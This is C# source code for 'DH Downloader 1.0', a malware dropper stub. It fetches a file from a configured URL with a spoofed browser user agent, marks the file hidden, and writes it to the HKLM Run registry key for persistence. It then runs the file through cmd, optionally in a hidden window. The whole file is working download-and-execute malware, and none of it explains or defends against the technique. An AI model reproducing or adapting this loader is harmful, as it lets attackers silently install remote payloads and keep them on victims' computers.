// DH Downloader 1.0
// (C) Doddy Hackman 2014
// Thanks to : http://weblogs.asp.net/jhallal/hide-the-console-window-in-quot-c-console-application-quot

using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Net;
using System.IO;
using Microsoft.Win32;

namespace stub
{

    class Program
    {

        // Functions

        static public void cmd_normal(string command)
        {
            try
            {
                System.Diagnostics.Process.Start("cmd", "/c " + command);
            }
            catch
            {
                //
            }
        }

        static public void cmd_hide(string command)
        {
            try
            {
                ProcessStartInfo cmd_now = new ProcessStartInfo("cmd", "/c " + command);
                cmd_now.RedirectStandardOutput = false;
                cmd_now.WindowStyle = ProcessWindowStyle.Hidden;
                cmd_now.UseShellExecute = true;
                Process.Start(cmd_now);
            }
            catch
            {
                //
            }
        }

        static public void add_startup(string path)
        {
            try
            {
                RegistryKey loadnow = Registry.LocalMachine;
                loadnow = loadnow.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                loadnow.SetValue("uberkzz", path, RegistryValueKind.String);
                loadnow.Close();
            }
            catch
            {
                //
            }
        }

        //

        static void Main(string[] args)
        {

            load_config config = new load_config();
            config.load_data();
            string check_online = config.downloader_online;
            if (check_online == "1")
            {
                Console.WriteLine("[+] Downloader Online");

                string url = config.url;
                string opcion_change_name = config.opcion_change_name;
                string text_change_name = config.text_change_name;
                string opcion_carga_normal = config.opcion_carga_normal;
                string opcion_carga_hide = config.opcion_carga_hide;
                string ruta_donde_bajar = config.ruta_donde_bajar;
                string opcion_ocultar_archivo = config.opcion_ocultar_archivo;
                string opcion_startup = config.opcion_startup;

                string nombre_final = "";
                string directorio_final = "";
                string ruta_final = "";

                //string output = config.get_data();
                //Console.WriteLine(output);

                if (opcion_change_name == "1")
                {
                    nombre_final = text_change_name;
                }
                else
                {
                    nombre_final = Path.GetFileName(url);
                }

                if (ruta_donde_bajar != "")
                {
                    directorio_final = Environment.GetEnvironmentVariable(ruta_donde_bajar);
                }
                else
                {
                    directorio_final = Environment.GetEnvironmentVariable("USERPROFILE");
                }

                ruta_final = directorio_final + "/" + nombre_final;

                Console.WriteLine("[+] URL : "+url+"\n");
                Console.WriteLine("[+] Filename : "+ruta_final+"\n");

                try
                {
                    WebClient nave = new WebClient();
                    nave.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0";
                    nave.DownloadFile(url, ruta_final);
                }
                catch
                {
                    //
                }

                if (opcion_ocultar_archivo == "1")
                {
                    Console.WriteLine("[+] Hide : "+ruta_final+"\n");
                    try
                    {
                        File.SetAttributes(ruta_final, FileAttributes.Hidden);
                    }
                    catch
                    {
                        //
                    }
                }

                if (opcion_startup == "1")
                {
                    Console.WriteLine("[+] Add Startup : "+ruta_final+"\n");
                    add_startup(ruta_final);
                }

                if (opcion_carga_normal == "1")
                {
                    Console.WriteLine("[+] Load normal : "+ruta_final+"\n");
                    cmd_normal(ruta_final);
                }

                if (opcion_carga_hide == "1")
                {
                    Console.WriteLine("[+] Load hide : "+ruta_final+"\n");
                    cmd_hide(ruta_final);
                }
               
                //Console.ReadKey();

            }
            else
            {
                Console.WriteLine("[-] Downloader OffLine");
                //Console.ReadKey();
            }
            
        }
    }
}

// The End ?
